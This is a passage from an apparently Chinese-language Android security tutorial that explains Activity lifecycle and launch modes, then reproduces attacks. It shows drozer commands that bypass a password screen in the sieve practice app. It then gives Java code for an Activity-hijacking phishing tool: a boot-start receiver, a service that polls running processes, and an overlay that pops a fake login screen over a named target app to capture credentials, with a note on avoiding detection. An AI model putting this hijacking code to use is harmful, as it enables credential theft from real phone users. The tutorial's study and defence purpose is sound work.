class=\"type\">int</span> resultCode,  Intent data)</span> &#123;  <span class=\"comment\">// 参数1：我们启动活动的请求码 参数2：我们返回数据时传入结果  参数3：携带返回数据的Intent</span></span><br><span class=\"line\">       <span class=\"built_in\">super</span>.onActivityResult(requestCode, resultCode, data);</span><br><span class=\"line\">       <span class=\"keyword\">switch</span> (requestCode)&#123;</span><br><span class=\"line\">           <span class=\"keyword\">case</span>  <span class=\"number\">1</span>:</span><br><span class=\"line\">               <span class=\"keyword\">if</span>(requestCode == RESULT_OK)&#123;</span><br><span class=\"line\">                   <span class=\"type\">String</span> <span class=\"variable\">returnData</span> <span class=\"operator\">=</span>data.getStringExtra(<span class=\"string\">&quot;data&quot;</span>);</span><br><span class=\"line\">               &#125;</span><br><span class=\"line\">               <span class=\"keyword\">break</span>;</span><br><span class=\"line\">           <span class=\"keyword\">default</span>:</span><br><span class=\"line\">       &#125;</span><br><span class=\"line\">   &#125;</span><br></pre></td></tr></table></figure>\n\n<p>如果我们要实现Back返回MainActivity，我们需要在SecondActivity中重写onBackPressed()方法</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">@Override</span></span><br><span class=\"line\">  <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">onBackPressed</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">      <span class=\"built_in\">super</span>.onBackPressed();</span><br><span class=\"line\">      <span class=\"type\">Intent</span> <span class=\"variable\">intent</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">Intent</span>();</span><br><span class=\"line\">      intent.putExtra(<span class=\"string\">&quot;data&quot;</span>,<span class=\"string\">&quot;data&quot;</span>);</span><br><span class=\"line\">      setResult(RESULT_OK,intent);</span><br><span class=\"line\">      finish();</span><br><span class=\"line\">  &#125;</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"（3）Activity的生命周期\"><a href=\"#（3）Activity的生命周期\" class=\"headerlink\" title=\"（3）Activity的生命周期\"></a>（3）Activity的生命周期</h4><p>Activity类中定义了7个回调方法，覆盖了Activity声明周期的每一个环节：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">onCreate()： 在Activity第一次创建时调用</span><br><span class=\"line\">onStart():在Activity可见但是没有焦点时调用</span><br><span class=\"line\">onResume():在Activity可见并且有焦点时调用</span><br><span class=\"line\">onPause()：这个方法会在准备启动或者恢复另一个Activity时调用，我们通常在该方法中释放消耗CPU的资源或者保存数据，但在该方法内不能做耗时操作，否则影响另一个另一个Activity的启动或恢复。</span><br><span class=\"line\">onStop()：在Activity不可见时调用，它和onPause主要区别就是：onPause在失去焦点时会调用但是依然可见，而onStop是完全不可见。</span><br><span class=\"line\">onDestory()：在Activity被销毁前调用</span><br><span class=\"line\">onRestart()：在Activity由不在栈顶到再次回到栈顶并且可见时调用。</span><br></pre></td></tr></table></figure>\n\n<p>生命周期调用图：</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0009/2.png\" alt=\"image-20210905173003541\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">我们可以将活动分为3中生存期：</span><br><span class=\"line\">\t（1）完整生存期：活动在onCreate()和onDestroy()方法之间所经历的，从开始初始化到完成释放内存</span><br><span class=\"line\">\t（2）可见生存期：活动在onStart()和onStop()方法之间所经历的，主要包括资源的加载和资源的释放</span><br><span class=\"line\">\t（3）前台生存期：活动在onResume()方法和onPause()方法之间所经历的，主要是Activity的运行</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"（4）Activity的启动模式\"><a href=\"#（4）Activity的启动模式\" class=\"headerlink\" title=\"（4）Activity的启动模式\"></a>（4）Activity的启动模式</h4><p>我们这里之所以要介绍Activity的启动模式，是因为Activity界面劫持就是根据Activity的运行特点所实现的</p>\n<p>Activity一共有四种启动模式：standard模式、singleTop模式、singleTask模式、singleInstance模式。下面我们简单介绍一下：</p>\n<p><strong>standard模式</strong></p>\n<p>如果不显示指定启动模式，那么Activity的启动模式就是standard，在该模式下不管Activity栈中有无Activity，均会创建一个新的Activity并入栈，并处于栈顶的位置</p>\n<p><strong>singleTop模式</strong></p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">（<span class=\"number\">1</span>）启动一个Activity，这个Activity位于栈顶，则不会重新创建Activity,而直接使用，此时也不会调用Activity的onCreate()，因为并没有重新创建Activity</span><br><span class=\"line\">     Activity生命周期：</span><br><span class=\"line\">    onPause-----&gt;onNewIntent------&gt;onResume</span><br><span class=\"line\">    这个过程中调用了 onNewIntent(intent: Intent?),我们可以在该函数中通过Intent获取新传递过来的数据，因为此时数据可能已经发生变化</span><br><span class=\"line\"> (<span class=\"number\">2</span>) 要启动的Activity不在栈顶，那么启动该Activity就会重新创建一个新的Activity并入栈，此时栈中就有<span class=\"number\">2</span>个Activity的实例了</span><br></pre></td></tr></table></figure>\n\n<p><strong>singleTask模式</strong></p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">如果准备启动的ActivityA的启动模式为singleTask的话，那么会先从栈中查找是否存在ActivityA的实例：</span><br><span class=\"line\">场景一、如果存在则将ActivityA之上的Activity都出栈，并调用ActivityA的onNewIntent()</span><br><span class=\"line\">\t   ActivityA启动ActivityB,然后启动ActivityA，此时生命周期过程：</span><br><span class=\"line\">\t   ActivityB onPause-----&gt;ActivityA(onRestart---&gt;onStart---&gt;onNewIntent---&gt;onResume)---------&gt;ActivityB(onStop---&gt;onDestroy)</span><br><span class=\"line\">\t   </span><br><span class=\"line\">场景二、如果ActivityA位于栈顶，则直接使用并调用onNewInent()，此时和singleTop一样</span><br><span class=\"line\">\t   ActivityA启动ActivityA，此时生命周期过程:</span><br><span class=\"line\">\t   ActivityA(onPause---&gt;onNewIntent---&gt;onResume)</span><br><span class=\"line\">\t   </span><br><span class=\"line\">场景三、 如果栈中不存在ActivityA的实例则会创建一个新的Activity并入栈。</span><br><span class=\"line\">\t   ActivityA启动ActivityB,此时生命周期过程：</span><br><span class=\"line\">\t   ActivityA(onCreate---&gt;onStart---&gt;onResume)</span><br></pre></td></tr></table></figure>\n\n<p><strong>singleInstance模式</strong></p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">指定singleInstance模式的Activity会启动一个新的返回栈来管理这个Activity（其实如果singleTask模式指定了不同的taskAffinity，也会启动一个新的返回栈</span><br><span class=\"line\">我们可以通过这种模式去实现其他程序和我们程序能共享这个Activity实例，在这种模式下，会有一个单独的返回栈来管理这个Activity，无论哪个应用程序来访问这个Activity，都在同一个返回栈中，也就解决了共享Activity实例的问题</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"2-Activity-漏洞种类和危害\"><a href=\"#2-Activity-漏洞种类和危害\" class=\"headerlink\" title=\"2.Activity 漏洞种类和危害\"></a>2.Activity 漏洞种类和危害</h3><p>我们在上文中详细介绍了Activity的运行原理，接下来我们了解一些Activity的漏洞种类和应用的安全场景</p>\n<h4 id=\"（1）Activity的漏洞种类\"><a href=\"#（1）Activity的漏洞种类\" class=\"headerlink\" title=\"（1）Activity的漏洞种类\"></a>（1）Activity的漏洞种类</h4><p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0009/3.png\" alt=\"image-20210905185725812\"></p>\n<h4 id=\"（2）Activity安全场景和危害\"><a href=\"#（2）Activity安全场景和危害\" class=\"headerlink\" title=\"（2）Activity安全场景和危害\"></a>（2）Activity安全场景和危害</h4><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">Activity的组件导出，一般会导致的问题：Android Browser Intent Scheme URLs的攻击手段</span><br><span class=\"line\">(<span class=\"number\">1</span>)拒绝服务攻击：通过Intent给Activity传输畸形数据使得程序崩溃从而影响用户体验</span><br><span class=\"line\">(<span class=\"number\">2</span>)越权攻击：Activity用户界面绕过会造成用户信息窃取、Activity界面被劫持产生欺诈等安全事件</span><br><span class=\"line\">(<span class=\"number\">3</span>)组件导出导致钓鱼欺诈</span><br><span class=\"line\">(<span class=\"number\">4</span>)隐式启动intent包含敏感数据</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"三、Activity漏洞原理分析和复现\"><a href=\"#三、Activity漏洞原理分析和复现\" class=\"headerlink\" title=\"三、Activity漏洞原理分析和复现\"></a>三、Activity漏洞原理分析和复现</h2><h3 id=\"1-越权绕过\"><a href=\"#1-越权绕过\" class=\"headerlink\" title=\"1.越权绕过\"></a>1.越权绕过</h3><h4 id=\"（1）原理介绍\"><a href=\"#（1）原理介绍\" class=\"headerlink\" title=\"（1）原理介绍\"></a>（1）原理介绍</h4><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">在Android系统中，Activity默认是不导出的，如果设置了exported = <span class=\"string\">&quot;true&quot;</span> 这样的关键值或者是添加了&lt;intent-filter&gt;这样的属性，那么此时Activity是导出的，就会导致越权绕过或者是泄露敏感信息等安全风险。</span><br><span class=\"line\">例如：</span><br><span class=\"line\">(<span class=\"number\">1</span>)一些敏感的界面需要用户输入密码才能查看，如果没有对调用此Activity的组件进行权限验证，就会造成验证的越权问题，导致攻击者不需要密码就可以打开</span><br><span class=\"line\">(<span class=\"number\">2</span>)通过Intent给Activity传输畸形数据使得程序崩溃拒绝服务</span><br><span class=\"line\">(<span class=\"number\">3</span>)对Activity界面进行劫持</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"（2）漏洞复现\"><a href=\"#（2）漏洞复现\" class=\"headerlink\" title=\"（2）漏洞复现\"></a>（2）漏洞复现</h4><p>样本 sieve.apk drozer.apk</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0009/4.png\" alt=\"image-20210905185725812\"></p>\n<p>首先，我们需要配置drozer的基本环境，具体配置操作，参考：<a href=\"https://bbs.pediy.com/thread-269196.htm\">Android漏洞挖掘三板斧——drozer+Inspeckage(Xposed)+MobSF</a></p>\n<p>手机端打开代理，开启31415端口</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">adb forward tcp:<span class=\"number\">31415</span> tcp:<span class=\"number\">31415</span></span><br><span class=\"line\">drozer console connect</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0009/5.png\" alt=\"image-20210905185725812\"></p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0009/6.png\" alt=\"image-20210905185725812\"></p>\n<p>我们尝试使用drozer去越权绕过该界面，首先，我们先列出程序中所有的APP 包</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">run app.<span class=\"keyword\">package</span>.list</span><br></pre></td></tr></table></figure>\n\n<p>我们通过查询字段，可以快速定位到sieve的包名</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0009/7.png\" alt=\"image-20210905185725812\"></p>\n<p>然后，我们去查询目标应用的攻击面</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">run app.<span class=\"keyword\">package</span>.attacksurface com.mwr.example.sieve</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0009/8.png\" alt=\"image-20210905185725812\"></p>\n<p>我们可以看出，有三个activity是被导出的，我们再具体查询暴露activity的信息</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">run app.activity.info -a  com.mwr.example.sieve</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0009/9.png\" alt=\"image-20210905185725812\"></p>\n<p>说明我们可以通过强制跳转其他两个界面，来实现越权绕过</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">run app.activity.start --component com.mwr.example.sieve com.mwr.example.sieve.PWList</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0009/10.png\" alt=\"image-20210905185725812\"></p>\n<p>说明我们成功的实现了越权绕过</p>\n<h4 id=\"（3）防护策略\"><a href=\"#（3）防护策略\" class=\"headerlink\" title=\"（3）防护策略\"></a>（3）防护策略</h4><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">防护策略：</span><br><span class=\"line\">(<span class=\"number\">1</span>)私有Activity不应被其他应用启动相对是安全的，创建activity时：设置exported属性为<span class=\"literal\">false</span></span><br><span class=\"line\">(<span class=\"number\">2</span>)公开暴露的Activity组件，可以被任意应用启动，创建Activity：设置export属性为<span class=\"literal\">true</span>，谨慎处理接收的Intent，有返回数据不包含敏感信息，不应发送敏感信息，收到返回数据谨慎处理</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"2-钓鱼欺诈-x2F-Activity劫持\"><a href=\"#2-钓鱼欺诈-x2F-Activity劫持\" class=\"headerlink\" title=\"2.钓鱼欺诈&#x2F;Activity劫持\"></a>2.钓鱼欺诈&#x2F;Activity劫持</h3><h4 id=\"（1）原理介绍-1\"><a href=\"#（1）原理介绍-1\" class=\"headerlink\" title=\"（1）原理介绍\"></a>（1）原理介绍</h4><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">原理介绍：</span><br><span class=\"line\">（<span class=\"number\">1</span>）Android APP中不同界面的切换通过Activity的调度来实现，而Acticity的调度是由Android系统中的AMS来实现。每个应用想启动或停止一个进程，都报告给AMS，AMS收到启动或停止Activity的消息时，先更新内部记录，再通知相应的进程或停止指定的Activity。当新的Activity启动，前一个Activity就会停止，这些Activity会保留在系统中的一个Activity历史栈中。每有一个Activity启动，它就压入历史栈顶，并在手机上显示。当用户按下back，顶部的Activity弹出，恢复前一个Activity，栈顶指向当前的Activity。</span><br><span class=\"line\">（<span class=\"number\">2</span>）由于Activity的这种特性，如果在启动一个Activity时，给它加入一个标志位FLAGACTIVITYNEW_TASK,就能使它置于栈顶并立马呈现给用户，如果这个Activity是用于盗号的伪装Activity，就会产生钓鱼安全事件或者一个Activity中有webview加载，允许加载任意网页都有可能产生钓鱼事件。</span><br><span class=\"line\"></span><br><span class=\"line\">实现原理：</span><br><span class=\"line\">如果我们注册一个receiver，响应android.intent.action.BOOT_COMPLETED，使得开启启动一个service；这个service，会启动一个计时器，不停枚举当前进程中是否有预设的进程启动，如果发现有预设进程，则使用FLAG_ACTIVITY_NEW_TASK启动自己的钓鱼界面，截获正常应用的登录凭证</span><br><span class=\"line\"></span><br><span class=\"line\">实现步骤：</span><br><span class=\"line\">(<span class=\"number\">1</span>)启动一个服务</span><br><span class=\"line\">(<span class=\"number\">2</span>)不断扫描当前进程</span><br><span class=\"line\">(<span class=\"number\">3</span>)找到目标后弹出伪装窗口</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0009/11.png\" alt=\"image-20210905191612675\"></p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0009/12.png\" alt=\"image-20210905191635598\"></p>\n<h4 id=\"（2）漏洞复现-1\"><a href=\"#（2）漏洞复现-1\" class=\"headerlink\" title=\"（2）漏洞复现\"></a>（2）漏洞复现</h4><p>在进行Android 界面劫持过程中，我发现根据Android版本的变化情况，目前不同Android版本实现的功能代码有一定的差异性，再经过多次的学习和总结后，我复现而且改进了针对Android 6.0界面劫持的功能代码，并对不同版本的页面劫持做了一个初步的总结，下面是具体实验的详细过程:</p>\n<p>首先我们新建一个服务类HijackingService.class，然后在MainActivity里面启动这个服务类</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">MainActivity</span> <span class=\"keyword\">extends</span> <span class=\"title class_\">AppCompatActivity</span> &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">protected</span> <span class=\"keyword\">void</span> <span class=\"title function_\">onCreate</span><span class=\"params\">(Bundle savedInstanceState)</span> &#123;</span><br><span class=\"line\">        <span class=\"built_in\">super</span>.onCreate(savedInstanceState);</span><br><span class=\"line\">        setContentView(R.layout.activity_main);</span><br><span class=\"line\">        <span class=\"type\">Intent</span> <span class=\"variable\">intent2</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">Intent</span>(<span class=\"built_in\">this</span>,HijackingService.class);</span><br><span class=\"line\">        startService(intent2);</span><br><span class=\"line\">        Log.w(<span class=\"string\">&quot;hijacking&quot;</span>,<span class=\"string\">&quot;activity启动用来劫持的Service&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>我们可以看到程序一旦启动，就会启动HijackingService.class</p>\n<p>然后我们编写一个HijackingApplication类，主要负责添加劫持类别，清除劫持类别，判断是否已经劫持</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">HijackingApplication</span>&#123;  </span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">static</span> List&lt;String&gt; hijackings = <span class=\"keyword\">new</span> <span class=\"title class_\">ArrayList</span>();  </span><br><span class=\"line\">  </span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">addProgressHijacked</span><span class=\"params\">(String paramString)</span>&#123;    <span class=\"comment\">//添加劫持进程</span></span><br><span class=\"line\">       hijackings.add(paramString);  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">  </span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">clearProgressHijacked</span><span class=\"params\">()</span>&#123;       <span class=\"comment\">//清楚劫持进程集合</span></span><br><span class=\"line\">       hijackings.clear();  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">  </span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"type\">boolean</span> <span class=\"title function_\">hasProgressBeHijacked</span><span class=\"params\">(String paramString)</span>&#123;    <span class=\"comment\">//判断该进程是否被劫持</span></span><br><span class=\"line\">       <span class=\"keyword\">return</span> hijackings.contains(paramString);  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">&#125;  </span><br></pre></td></tr></table></figure>\n\n<p>说明：这个类的主要功能是，保存已经劫持过的包名，防止我们多次劫持增加暴露风险。</p>\n<p>我们为了实现开机启动服务，新建一个广播类：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">HijackingReciver</span> <span class=\"keyword\">extends</span> <span class=\"title class_\">BroadcastReceiver</span> &#123;</span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">onReceive</span><span class=\"params\">(Context context, Intent intent)</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(intent.getAction().equals(<span class=\"string\">&quot;android.intent.action.BOOT_COMPLETED&quot;</span>))&#123;</span><br><span class=\"line\">            Log.w(<span class=\"string\">&quot;hijacking&quot;</span>,<span class=\"string\">&quot;开机启动&quot;</span>);</span><br><span class=\"line\">            <span class=\"type\">Intent</span> <span class=\"variable\">intent2</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">Intent</span>(context,HijackingService.class);</span><br><span class=\"line\">            context.startService(intent2);</span><br><span class=\"line\">            Log.w(<span class=\"string\">&quot;hijacking&quot;</span>,<span class=\"string\">&quot;启动用来劫持的Service&quot;</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>然后我们编写劫持类 HijackingService.class</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">private</span> <span class=\"type\">boolean</span> <span class=\"variable\">hasStart</span> <span class=\"operator\">=</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"type\">boolean</span> isStart;</span><br><span class=\"line\">    HashMap&lt;String, Class&lt;?&gt;&gt; map = <span class=\"keyword\">new</span> <span class=\"title class_\">HashMap</span>&lt;String, Class&lt;?&gt;&gt;();</span><br><span class=\"line\">    <span class=\"comment\">//新建线程</span></span><br><span class=\"line\">    <span class=\"type\">Handler</span> <span class=\"variable\">handler</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">Handler</span>();</span><br><span class=\"line\">    <span class=\"type\">Runnable</span> <span class=\"variable\">mTask</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">Runnable</span>() &#123;</span><br><span class=\"line\">        <span class=\"meta\">@Override</span></span><br><span class=\"line\">        <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">run</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">            Log.w(<span class=\"string\">&quot;TAG&quot;</span>,<span class=\"string\">&quot;ABC&quot;</span>);</span><br><span class=\"line\">            <span class=\"type\">int</span> <span class=\"variable\">i</span> <span class=\"operator\">=</span><span class=\"number\">1</span>;</span><br><span class=\"line\">            <span class=\"comment\">//ActivityManager activityManager = (ActivityManager) getSystemService(Context.ACTIVITY_SERVICE);</span></span><br><span class=\"line\">            <span class=\"comment\">//List&lt;ActivityManager.RunningAppProcessInfo&gt; appProcessInfos = activityManager.getRunningAppProcesses();</span></span><br><span class=\"line\">          <span class=\"comment\">//  List&lt;ActivityManager.RunningAppProcessInfo&gt; appProcessInfos = ((ActivityManager) HijackingService.this.getSystemService(Context.ACTIVITY_SERVICE)).getRunningAppProcesses();</span></span><br><span class=\"line\">           <span class=\"comment\">//String Processesnew = ForegroundProcess.getForegroundApp();</span></span><br><span class=\"line\">           <span class=\"comment\">//Log.w(&quot;TAG============&quot;,Processesnew);</span></span><br><span class=\"line\">           List&lt;AndroidAppProcess&gt; Processes = AndroidProcesses.getRunningAppProcesses();</span><br><span class=\"line\">            Log.w(<span class=\"string\">&quot;hijacking&quot;</span>, <span class=\"string\">&quot;=================正在枚举进程=======================&quot;</span>);</span><br><span class=\"line\">            <span class=\"comment\">//枚举进程</span></span><br><span class=\"line\">            <span class=\"keyword\">for</span>( AndroidAppProcess appProcessInfo: Processes)&#123;</span><br><span class=\"line\">                Log.w(<span class=\"string\">&quot;TAG&quot;</span>,appProcessInfo.name);</span><br><span class=\"line\">                <span class=\"comment\">/*try &#123;</span></span><br><span class=\"line\"><span class=\"comment\">                    Stat stat = appProcessInfo.stat();</span></span><br><span class=\"line\"><span class=\"comment\">                    int pid = stat.getPid();</span></span><br><span class=\"line\"><span class=\"comment\">                    int parentProcessId = stat.ppid();</span></span><br><span class=\"line\"><span class=\"comment\">                    long startTime = stat.stime();</span></span><br><span class=\"line\"><span class=\"comment\">                    int policy = stat.policy();</span></span><br><span class=\"line\"><span class=\"comment\">                    char state = stat.state();</span></span><br><span class=\"line\"><span class=\"comment\">                    Log.w(&quot;TAG&quot;,&quot;pid：&quot;+pid+&quot; parentProcessId:&quot;+parentProcessId+&quot; startTime:&quot;+startTime+&quot; policy:&quot;+policy+&quot; state:&quot;+state);</span></span><br><span class=\"line\"><span class=\"comment\">                &#125; catch (IOException e) &#123;</span></span><br><span class=\"line\"><span class=\"comment\">                    e.printStackTrace();</span></span><br><span class=\"line\"><span class=\"comment\">                &#125;</span></span><br><span class=\"line\"><span class=\"comment\">                */</span></span><br><span class=\"line\">                </span><br><span class=\"line\">                <span class=\"type\">String</span> <span class=\"variable\">ProcessesRunning</span> <span class=\"operator\">=</span> ForegroundProcess.getForegroundApp();</span><br><span class=\"line\">                Log.w(<span class=\"string\">&quot;TAG============&quot;</span>,ProcessesRunning);</span><br><span class=\"line\">                <span class=\"keyword\">if</span>(map.containsKey(ProcessesRunning)) &#123;</span><br><span class=\"line\">                    <span class=\"comment\">// Log.w(&quot;TAG&quot;,&quot;GHZ&quot;);</span></span><br><span class=\"line\">                    <span class=\"comment\">//如果包含在我们劫持的map中</span></span><br><span class=\"line\">                    <span class=\"keyword\">if</span> (map.containsKey(appProcessInfo.name)) &#123;</span><br><span class=\"line\">                        Log.w(<span class=\"string\">&quot;准备劫持&quot;</span>, appProcessInfo.name);</span><br><span class=\"line\">                        hijacking(appProcessInfo.name);</span><br><span class=\"line\">                    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">                        <span class=\"comment\">//Log.w(&quot;hijacking&quot;,appProcessInfo.getPackageName());</span></span><br><span class=\"line\">                        <span class=\"comment\">//Log.w(&quot;abc&quot;,&quot;123&quot;);</span></span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            handler.postDelayed(mTask,<span class=\"number\">8000</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">private</span> <span class=\"keyword\">void</span> <span class=\"title function_\">hijacking</span><span class=\"params\">(String progressName)</span>&#123;</span><br><span class=\"line\">            <span class=\"comment\">//判断是否已经劫持，对劫持的过的程序跳过</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span>(!HijackingApplicaiton.hasProgressBeHijacked(progressName))&#123;</span><br><span class=\"line\">                <span class=\"type\">Intent</span> <span class=\"variable\">localIntent</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">Intent</span>(HijackingService.<span class=\"built_in\">this</span>.getBaseContext(),HijackingService.<span class=\"built_in\">this</span>.map.get(progressName));</span><br><span class=\"line\">                localIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);</span><br><span class=\"line\">                HijackingService.<span class=\"built_in\">this</span>.getApplication().startActivity(localIntent);</span><br><span class=\"line\">                HijackingApplicaiton.addProgressHijacked(progressName);</span><br><span class=\"line\">                Log.w(<span class=\"string\">&quot;TAG====hijacking&quot;</span>,<span class=\"string\">&quot;已经劫持成功&quot;</span>);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">onCreate</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">        <span class=\"built_in\">super</span>.onCreate();</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(!isStart)&#123;</span><br><span class=\"line\">            map.put(<span class=\"string\">&quot;com.cz.babySister&quot;</span>,SecondActivity.class);</span><br><span class=\"line\">            <span class=\"built_in\">this</span>.handler.postDelayed(<span class=\"built_in\">this</span>.mTask, <span class=\"number\">1000</span>);</span><br><span class=\"line\">            isStart = <span class=\"literal\">true</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> IBinder <span class=\"title function_\">onBind</span><span class=\"params\">(Intent intent)</span> &#123;</span><br><span class=\"line\">        <span class=\"comment\">// <span class=\"doctag\">TODO:</span> Return the communication channel to the service.</span></span><br><span class=\"line\">        <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> <span class=\"title class_\">UnsupportedOperationException</span>(<span class=\"string\">&quot;Not yet implemented&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span>  <span class=\"type\">boolean</span> <span class=\"title function_\">stopService</span><span class=\"params\">(Intent name)</span>&#123;</span><br><span class=\"line\">        hasStart = <span class=\"literal\">false</span>;</span><br><span class=\"line\">        Log.w(<span class=\"string\">&quot;TAG====hijacking&quot;</span>,<span class=\"string\">&quot;劫持服务停止&quot;</span>);</span><br><span class=\"line\">        HijackingApplicaiton.clearProgressHijacked();</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"built_in\">super</span>.stopService(name);</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n\n<p>我们编写劫持类中，最关键的就是如何获取当前的前台进程和遍历正在运行的进程，这也是Android版本更新后，导致不同版本劫持差异的主要原因，对这里我做了一个初步的总结：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">注意：</span><br><span class=\"line\">\t(<span class=\"number\">1</span>)我们实现界面劫持，主要是根据Android Activity设计的漏洞，而这就会涉及对ActivityManager的掌握</span><br><span class=\"line\">\t   网址：https:<span class=\"comment\">//blog.csdn.net/zhangxunxyy/article/details/80805394</span></span><br><span class=\"line\">\t(<span class=\"number\">2</span>)Android 获取当前的Activity，因为Android版本不同而具备一定差异性</span><br><span class=\"line\">\t   </span><br><span class=\"line\">\t   <span class=\"number\">1</span>)Android <span class=\"number\">5.0</span>之前可以使用getRunningTasks,该方法可以获得在前台运行的系统进程</span><br><span class=\"line\">\t   <span class=\"number\">2</span>)Android <span class=\"number\">5.0</span>-<span class=\"number\">6.0</span> getRunningTasks失效，可以使用getRunningAppProcesses方法暂时替代</span><br><span class=\"line\">\t   <span class=\"number\">3</span>)Android 